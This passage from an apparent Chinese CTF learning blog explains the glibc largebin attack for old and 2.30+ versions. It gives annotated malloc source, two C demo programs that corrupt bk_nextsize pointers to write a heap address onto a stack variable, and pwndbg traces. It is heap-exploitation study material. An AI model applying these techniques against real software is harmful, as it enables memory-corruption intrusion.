c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x380</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x500</span>);                                              </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk3);</span><br><span class="line">    chunk2[<span class="number">-1</span>] = <span class="number">0x3f1</span>; <span class="comment">//size</span></span><br><span class="line">    chunk2[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//fd</span></span><br><span class="line">    chunk2[<span class="number">2</span>] = <span class="number">0</span>; <span class="comment">//fd_nextsize</span></span><br><span class="line">    chunk2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>); <span class="comment">//bk，指向stack_var1-0x10的位置</span></span><br><span class="line">    chunk2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>); <span class="comment">//bk_nextsize，指向stack_var2-0x20的位置</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为largebin attack更多的在较高版本使用，这里调试就不放了（<del>绝对不是因为笔者本地glibc版本太高自己编译低版本编译半天没搞好</del>），具体的调试过程看<a href="https://xz.aliyun.com/news/15081">参考博客</a>即可。<br>先申请了三个大的chunk123，中间夹着的0x20的chunk是为了防止大的chunk被top chunk合并。然后free掉chunk1和chunk2，两个都进入了<code>unsorted bin</code><br>接着malloc一个0x90的堆，这时候发生了很多事。程序依次从<strong>fastbins–&gt;unsorted bin–&gt;smallbins–&gt;largebins–&gt;topchunk</strong>的顺序扫描（此处调试版本尚未引入<code>tcachehbin</code>，引入后的顺序为<strong>tcachebins–&gt;fastbins–&gt;unsorted bin–&gt;smallbins–&gt;largebins–&gt;topchunk</strong>），在<code>unsorted bin</code>找到了chunk1（<code>unsorted bin</code>是头部插入尾部取出的，FIFO），属于<code>smallbins</code>，放入<code>smallbins</code>，发现chunk2大小属于<code>largebins</code>，放入<code>largebins</code>。然后扫描<code>smallbins</code>，发现chunk1，大于需求，就分割出一块0xa0的chunk来供malloc所需，然后chunk1剩余部分放入<code>unsorted bin</code>等待分配。<br>接下来，free掉chunk3，chunk3也加入<code>unsorted bin</code>。这时候再修改chunk2，使其size小于chunk3，并修改其<code>bk</code>指针和<code>bk_nextsize</code>指针为两个目标值的相应偏移处。如图所示<br></p><p><img src="/images/JNsZQX6avEobhkL.png"></p><p>然后再malloc一块内存，与上一次malloc一样，这次malloc也会干很多事。继续将chunk1放入<code>smallbins</code>，然后chunk3进入<code>largebins</code>。然后扫描<code>smallbins</code>，分割chunk1，然后chunk1再放入<code>unsorted bin</code>听候发落<br>在chunk3进入<code>largebins</code>的时候，会进行双链表的指针维护更新。相关的部分源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)&#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//这里检测的是从unsorted_bins里提取出的堆块是否小于large_bins里最近被释放的堆块的大小，如果小于，就将fwd向前移，也就是与比它更小的堆块对比</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line"><span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">fwd = fwd-&gt;fd;<span class="comment">//相等的话，就往后排列</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd; <span class="comment">//这里,victim是从unsorted_bin提取出来的堆块，fwd是最近被释放进large_bin的堆块，分别对应我们的chunk3,chunk2</span></span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//在此前,chunk2-&gt;bk_nextsize已经被我们设置为了stack_var2-0x20的地址，所以chunk3的bk_nextsize指向它</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim; <span class="comment">//chunk2-&gt;bk_nextsize指向chunk3</span></span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//chunk3-&gt;bk_nextsize = stack_var2 - 0x20，也就是说我们已经伪造了一个堆块，(stack_var2-0x20)-&gt;fd_nexitsize就是stack_var2的地址，将该地址赋值为chunk3的堆头地址</span></span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk; <span class="comment">//这里bck被赋值为chunk2的bk，我们设置成了stack_var1-0x10，所以bck成了我们stack_var1-0x10这个虚假的chunk</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>实际上就是在<code>largebins</code>中找到一个不大于新进入chunk（也就是这里的chunk3）的chunk（也就是chunk2），然后根据<code>largebins</code>的结构更新<code>fd</code>,<code>bk</code>,<code>fd_nextsize</code>,<code>bk_nextsize</code>指针。这里更新并没有做相关安全检查，具体见上述注释。<br>会将chunk3的地址赋给chunk2的<code>bk_nextsize</code>（已经被我们篡改为stack_var2-0x20），以及chunk3的<code>bk_nextsize</code>指向chunk2的<code>bk_nextsize</code>（已经被我们篡改为stack_var2-0x20）。后续还会对<code>bk</code>和<code>fd</code>指针进行操作，最后会使得chunk2的<code>bk</code>（已经被我们篡改为stack_var1-0x10）指向chunk3。<br>结果就是，如果把stack_var2当做是一个指针，则这个指针指向了chunk3；如果把stack_var1当做一个指针，则也指向chunk3<br></p><h2 id="0x03-glibc2-30-的largebin-attack"><a href="#0x03-glibc2-30-的largebin-attack" class="headerlink" title="0x03 glibc2.30+ 的largebin attack"></a>0x03 glibc2.30+ 的largebin attack</h2><p>在更高版本，glibc对与<code>fd_nextsize</code>以及<code>bk_nextsize</code>增加了检查，部分源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">       victim-&gt;fd_nextsize = fwd;</span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd)) <span class="comment">//以上面的chunk2为例的话，那就是检测stack_var2-0x20的fd_nextsize是否指向chunk2。不是的话就报错</span></span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">       fwd-&gt;bk_nextsize = victim;</span><br><span class="line">       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)<span class="comment">// 同理，如果stack_var1-0x10的fd是否指向chunk2，不是就报错</span></span><br><span class="line">       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>经过这个检查，我们上述的攻击手法就不好使了。但是我们知道largebin attack在glibc高版本仍然屹立不倒。那么新的攻击点在哪呢？如下部分源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">assert (chunk_main_arena (bck-&gt;bk));<span class="comment">//断言bck-&gt;bk属于main_arena</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">       fwd = bck; <span class="comment">//这里的fwd可以粗略的认为是large_bin归属的main_arena</span></span><br><span class="line">       bck = bck-&gt;bk; <span class="comment">//bck成了main_arena的bk指针指向的堆块，也就是最小size组的代表chunk</span></span><br><span class="line">       victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="comment">//我们申请的小堆块的fd_nextsize指向了main_arena的fd指针，也就是所在的large_bin的最大的堆块（最大size组的代表chunk）</span></span><br><span class="line">       victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">// 插入chunk的bk_nextsize指向最大chunk的bk_nextsize，也就是原来的最小chunk</span></span><br><span class="line">    <span class="comment">//攻击点，没有检测，所以我们可以篡改最大堆块的bk_nextsize，所以当我们加入的chunk比最小chunk还小时仍然可以攻击</span></span><br><span class="line">       fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//先进行右值运算，如果在没有进行修改的情况下，等式可以化简为fwd-&gt;fd-&gt;bk_nextsize = victim，也就是最大堆块的bk_nextsize指向我们的最小堆块victim</span></span><br><span class="line">    <span class="comment">// 这时候如果最大chunk的bk_nextsize已经改成了我们的target-0x20，那么victim-&gt;bk_nextsize-&gt;fd_nextsize也就是(target-0x20)-&gt;fd_nextsize,也就是target指向了我们可以控制的chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们自己写个demo来调试一下验证<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> target = <span class="number">0</span>; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x428</span>); <span class="comment">// 最大chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x418</span>); <span class="comment">//攻击用chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//大于chunk1，将chunk1放入largebin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk2); </span><br><span class="line">    chunk1[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target - <span class="number">4</span>); <span class="comment">//修改最大chunk的bk_nextsize，指向target-0x20的位置</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x438</span>); <span class="comment">//大于chunk2，将chunk2放入largebin完成攻击</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;target (%p): %p\n&quot;</span>, &amp;target, (<span class="type">unsigned</span> <span class="type">long</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先申请一大一小的两个较大的chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x204c0 (with flag bits: 0x204c1)</span><br></pre></td></tr></table></figure><p>然后free掉chunk1<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559290 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x555555559290</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后malloc一个0x438的chunk（需要比chunk1更大，否则会导致chunk1被分割），将chunk1放入largebin<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x555555559290</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>然后free掉chunk2并修改chunk1的<code>bk_nextsize</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x7fffffffde80</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line">fd: 0x7ffff7e1ace0</span><br><span class="line">bk: 0x7ffff7e1ace0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555555596f0 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x5555555596f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>如上所示，chunk1的<code>bk_nextsize</code>的值变为了target的地址-0x20&#x3D;0x7fffffffde80<br>再次malloc一个0x438的chunk（比chunk2更大，否则会导致chunk2被分割），将chunk2放入largebin，完成攻击<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x5555555596f0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x5555555596f0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x555555559290</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x7fffffffde80</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x5555555596f0 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>我们查看攻击效果<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx  0x7fffffffde80</span><br><span class="line">0x7fffffffde80: 0x0000000000000000      0x00007fffffffdec0</span><br><span class="line">0x7fffffffde90: 0x00007fffffffdfd8      0x0000555555555261</span><br><span class="line">0x7fffffffdea0: 0x00005555555596f0      0x00005555555592a0</span><br><span class="line">0x7fffffffdeb0: 0x0000555555559700      0xea19bde1a8c35100</span><br><span class="line">0x7fffffffdec0: 0x0000000000000001      0x00007ffff7c29d90</span><br><span class="line">0x7fffffffded0: 0x0000000000000000      0x00005555555551a9</span><br><span class="line">0x7fffffffdee0: 0x00000001ffffdfc0      0x00007fffffffdfd8</span><br><span class="line">0x7fffffffdef0: 0x0000000000000000      0x69534c199618d9ea</span><br><span class="line">0x7fffffffdf00: 0x00007fffffffdfd8      0x00005555555551a9</span><br><span class="line">0x7fffffffdf10: 0x0000555555557da8      0x00007ffff7ffd040</span><br></pre></td></tr></table></figure><p>可以看到target（0x7fffffffdea0）已经指向了0x00005555555596f0，也就是我们的chunk2。后续便可以控制chunk2，来达成修改target指针的指向内容<br></p><h2 id="0x04-largebin-attack与其他攻击的结合应用"><a href="#0x04-largebin-attack与其他攻击的结合应用" class="headerlink" title="0x04 largebin attack与其他攻击的结合应用"></a>0x04 largebin attack与其他攻击的结合应用</h2><p>由于largebin attack可以修改指针指向，能够实现任意地址写入堆地址的特性，常作为堆攻击的跳板，以下仅仅举几个例子<br>一是与<code>tcache poisoning</code>结合，或者辅助劫持<code>tcache_perthread_struct</code>；二是与fastbin attack结合，修改<code>global_max_fast</code>的值，来实现更大size范围的fastbin attack；三是与FSOP结合，打<code>_IO_FILE</code><br>以后可能会开几篇博客记录一下（<del>咕咕？</del>）<br><del>再挖个坑，准备入坑学习<code>_IO_FILE</code></del>，已填(<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">关于_IO_FILE | 